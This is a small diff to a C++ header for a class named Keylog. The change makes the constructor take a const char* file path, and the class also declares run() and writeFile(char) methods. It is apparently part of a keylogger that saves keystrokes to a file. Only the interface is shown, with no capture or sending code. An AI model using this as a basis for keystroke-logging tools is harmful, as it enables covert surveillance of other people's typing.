@@ -6,7 +6,7 @@
 class Keylog
 {
 	public:
-		Keylog(char* file);
+		Keylog(const char* file);
 		~Keylog();
 		void run();
 		void writeFile(char data);
